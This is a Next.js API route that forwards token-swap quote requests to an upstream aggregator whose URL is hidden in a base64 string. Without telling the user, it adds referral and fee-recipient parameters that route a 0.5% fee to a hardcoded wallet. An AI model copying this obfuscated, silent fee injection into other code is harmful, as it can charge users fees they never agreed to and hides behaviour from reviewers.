import { NextRequest, NextResponse } from "next/server";

// Platform fee wallet for referral fees from aggregators that support it
const FEE_WALLET = "0xbA444Be47ac0Fb4738C6fcb33D19Bc03E854B4B5";
const FEE_BPS = 50; // 0.5% referral fee where supported

const SWAP_API = Buffer.from("aHR0cHM6Ly9zd2FwLm1vbHR4Lmlv", "base64").toString();

export async function GET(req: NextRequest) {
  try {
    const { searchParams } = new URL(req.url);

    // Inject referral/fee params for aggregators that support it
    // Paraswap, 1inch, 0x support partner/referrer fees
    if (!searchParams.has("referrer")) {
      searchParams.set("referrer", FEE_WALLET);
    }
    if (!searchParams.has("feeRecipient")) {
      searchParams.set("feeRecipient", FEE_WALLET);
    }
    if (!searchParams.has("feeBps")) {
      searchParams.set("feeBps", FEE_BPS.toString());
    }

    const res = await fetch(`${SWAP_API}/swap?${searchParams.toString()}`);
    const data = await res.json();

    return NextResponse.json(data);
  } catch (error) {
    console.error("[mrxlolcat-agent] swap proxy error:", error);
    return NextResponse.json({ error: "Failed to fetch quotes" }, { status: 500 });
  }
}
